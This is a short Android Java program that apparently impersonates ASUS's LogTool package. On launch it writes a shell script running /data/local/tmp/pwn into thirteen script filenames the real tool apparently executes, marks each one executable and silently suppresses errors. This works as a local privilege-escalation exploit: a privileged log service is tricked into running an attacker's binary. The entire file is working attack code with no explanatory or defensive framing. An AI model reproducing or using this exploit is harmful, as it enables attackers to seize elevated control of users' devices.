package com.asus.LogTool;

import android.app.Activity;
import android.os.Bundle;
import java.io.File;
import java.io.FileOutputStream;

public class MainActivity extends Activity {
    private static final String SCRIPT =
        "#!/system/bin/sh\n"
        + "exec /data/local/tmp/pwn 2>&1 >> /data/anr/pwn.log\n";

    @Override
    public void onCreate(Bundle b) {
        super.onCreate(b);
        try {
            File dir = new File(getFilesDir().getParent(), "files");
            dir.mkdirs();
            String[] names = {
                "logtool-executor.sh", "logtool-trigger.sh",
                "pshdog-starter.sh", "audiolog-toggle.sh",
                "logdog-starter.sh", "klogdog-starter.sh",
                "tcpdump-starter.sh", "hcidump-starter.sh",
                "modemtrace-starter.sh", "modem-stopall.sh",
                "archive-logs.sh", "clear-logs.sh", "packlogs.sh"
            };
            for (String n : names) {
                FileOutputStream f = new FileOutputStream(new File(dir, n));
                f.write(SCRIPT.getBytes());
                f.close();
                new File(dir, n).setExecutable(true, false);
            }
        } catch (Throwable t) { /* quiet */ }
        finish();
    }
}
